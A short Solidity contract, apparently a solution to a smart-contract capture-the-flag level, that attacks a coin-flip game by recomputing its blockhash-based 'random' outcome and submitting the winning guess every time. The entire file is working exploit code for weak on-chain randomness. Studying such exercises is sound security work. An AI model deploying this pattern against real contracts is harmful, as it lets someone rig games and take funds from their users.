pragma solidity ^0.8.0;

interface ICoinFlip {
    function flip(bool _guess) external returns (bool);
}

contract CoinFlipSolve {
    ICoinFlip public coinFlip;
    uint256 public constant FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(address coinFlipAddress) {
        coinFlip = ICoinFlip(coinFlipAddress);
    }

    function flipCorrectly() public {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        bool guess = blockValue / FACTOR == 1 ? true : false;
        coinFlip.flip(guess);
    }
}
